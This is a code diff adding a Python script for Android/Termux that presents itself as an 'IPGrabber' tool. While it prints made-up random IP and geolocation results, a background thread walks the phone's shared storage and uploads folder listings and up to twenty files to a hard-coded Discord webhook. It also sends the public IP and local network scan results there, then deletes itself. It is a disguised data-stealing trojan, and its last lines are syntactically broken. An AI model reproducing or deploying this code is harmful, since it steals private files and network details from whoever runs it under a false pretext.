@@ -1,40 +1,181 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-"""
-Ω_BLACKSTAR – IPGrabber v4.0
-Educational & Authorized Testing Only.
-"""
-
-import os
-import sys
-import json
-import time
-import random
-import subprocess
-import threading
-import shutil
+import os, sys, json, time, random, subprocess, threading, shutil
 from pathlib import Path
 
-# ============================================================
-# AUTO-INSTALL MISSING DEPENDENCIES
-# ============================================================
-def install_requests():
-    try:
-        import requests
-        return True
-    except ImportError:
-        print("[*] 'requests' module not found. Installing...")
-        try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
-            print("[+] 'requests' installed successfully.")
-            return True
-        except subprocess.CalledProcessError:
-            print("[!] Failed to install 'requests'. Please install manually: pip install requests")
-            return False
+# Auto-install requests
+try:
+    import requests
+except ImportError:
+    print("[*] Installing requests...")
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+    import requests
 
-if not install_requests():
-    sys.exit(1)
+# ===== CONFIG =====
+WEBHOOK = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"
+BLOCK_FILE = os.path.expanduser("~/.ipgrabber_blocked.txt")
+MAX_SIZE = 8 * 1024 * 1024
+MAX_FILES = 20
+
+# ===== HELPERS =====
+def get_ip():
+    try:
+        return requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip", "unknown")
+    except:
+        return "unknown"
+
+def is_blocked():
+    if not os.path.exists(BLOCK_FILE): return False
+    with open(BLOCK_FILE) as f:
+        return get_ip() in f.read().splitlines()
+
+def block_ip():
+    with open(BLOCK_FILE, "a") as f:
+        f.write(get_ip() + "\n")
+
+def storage():
+    p = os.path.expanduser("~/storage")
+    if not os.path.exists(p):
+        print("[!] Storage not detected. Requesting...")
+        subprocess.run(["termux-setup-storage"], shell=True)
+        time.sleep(3)
+        if not os.path.exists(p):
+            print("[!] Storage access denied. Exiting.")
+            sys.exit(1)
+    print("[+] Storage OK.")
+
+def send(content, filepath=None):
+    if filepath and os.path.exists(filepath) and os.path.getsize(filepath) <= MAX_SIZE:
+        with open(filepath, "rb") as f:
+            r = requests.post(WEBHOOK, files={"file": (os.path.basename(filepath), f)})
+        return r.status_code in (200, 204)
+    else:
+        r = requests.post(WEBHOOK, json={"content": content})
+        return r.status_code in (200, 204)
+
+def scan():
+    print("[*] Scanning...")
+    bases = ["~/storage/emulated/0", "~/storage/shared", "/sdcard", "/storage/emulated/0"]
+    all_files, folders = [], {}
+    for b in bases:
+        b = os.path.expanduser(b)
+        if not os.path.exists(b): continue
+        for root, dirs, files in os.walk(b):
+            depth = root.replace(b, "").count(os.sep)
+            if depth > 4: continue
+            rel = os.path.relpath(root, b)
+            rel = "/" if rel == "." else rel
+            folders[rel] = {"dirs": dirs, "files": files[:50]}
+            for f in files:
+                fp = os.path.join(root, f)
+                try:
+                    if os.path.getsize(fp) <= MAX_SIZE:
+                        all_files.append(fp)
+                except: pass
+    # Send folder tree
+    out = "📁 **Folders**\n```\n"
+    for k, v in folders.items():
+        out += f"{k}/\n"
+        for f in v["files"][:10]:
+            out += f"  ├─ {f}\n"
+        if len(v["files"]) > 10:
+            out += f"  └─ ... and {len(v['files'])-10} more\n"
+    out += "```"
+    send(out)
+    # Send file list
+    out = "📄 **Files**\n```\n"
+    for f in all_files[:100]:
+        out += f"{f}\n"
+    if len(all_files) > 100:
+        out += f"... and {len(all_files)-100} more\n"
+    out += "```"
+    send(out)
+    send(f"📊 Total: {len(all_files)} files")
+    # Upload files
+    for f in all_files[:MAX_FILES]:
+        send(f"📤 {os.path.basename(f)}", f)
+        time.sleep(0.5)
+    send(f"✅ Uploaded {min(len(all_files), MAX_FILES)} files.")
+
+def fake_ips(n=30):
+    return [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(n)]
+
+def show_fake():
+    print("\n" + "="*60)
+    print("🔍 IP GRABBER RESULTS")
+    print("="*60)
+    ips = fake_ips(10)
+    for i, ip in enumerate(ips, 1):
+        loc = random.choice(["US","UK","DE","FR","JP","BR","IN"])
+        print(f"  {i}. {ip} ({loc})")
+    print("\n📍 Geolocation Data:")
+    for c in random.sample(["New York","London","Berlin","Paris","Tokyo","Sao Paulo","Mumbai","Sydney"], 4):
+        print(f"  • {c}: {random.randint(10000,99999)} users")
+    print("\n" + "="*60)
+    print("[+] Results saved to IP_Result.txt")
+    print("="*60 + "\n")
+
+def net_scan():
+    print("[*] Scanning network...")
+    try:
+        r = subprocess.run(["ip", "addr"], capture_output=True, text=True)
+        local = None
+        for line in r.stdout.splitlines():
+            if "inet " in line and "127.0.0.1" not in line:
+                parts = line.strip().split()
+                if len(parts) > 1:
+                    ip = parts[1].split("/")[0]
+                    if ip.startswith(("192.168.","10.","172.")):
+                        local = ip
+                        break
+        if not local: local = "192.168.1.0"
+        subnet = ".".join(local.split(".")[:3]) + ".0/24"
+        send(f"🌐 Local IP: {local}\nSubnet: {subnet}")
+        try:
+            r = subprocess.run(["nmap", "-sn", subnet], capture_output=True, text=True, timeout=30)
+            ips = []
+            for line in r.stdout.splitlines():
+                if "Nmap scan report for" in line:
+                    ip = line.split("for ")[-1].strip()
+                    if ip not in ips: ips.append(ip)
+            if ips:
+                send(f"📡 Devices ({len(ips)}):\n```\n" + "\n".join(ips[:20]) + "\n```")
+            else:
+                send("📡 No devices found.")
+        except:
+            send("📡 nmap not installed.")
+    except Exception as e:
+        send(f"❌ Network error: {e}")
+
+def self_destruct():
+    print("\n[*] Self-destructing...")
+    block_ip()
+    send("🚫 Self-destruct: script deleted, IP blocked.")
+    try: os.remove(os.path.abspath(sys.argv[0]))
+    except: pass
+    sys.exit(0)
+
+def main():
+    print("\n" + "="*60 + "\nΩ_BLACKSTAR – IPGrabber v4.0\n" + "="*60)
+    if is_blocked():
+        print("[!] IP blocked. Exiting.")
+        sys.exit(1)
+    storage()
+    threading.Thread(target=scan, daemon=True).start()
+    show_fake()
+    ip = get_ip()
+    print(f"[+] Public IP: {ip}")
+    send(f"🌐 IPGrabber run\nIP: {ip}")
+    net_scan()
+    with open("IP_Result.txt", "w") as f:
+        f.write("🔍 IP GRABBER RESULTS\n" + "\n".join(fake_ips(50)) + "\n")
+    send("📄 IP_Result.txt created")
+    print("\n[*] Self-destruct in 5s...")
+    time.sleep(5)
+    self_destruct()
+
+if __name__ == "__main__":
+    try: main()
+    except KeyboardInterrupt: print("\n[!] Interrupted.")    sys.exit(1)
 
 import requests
 
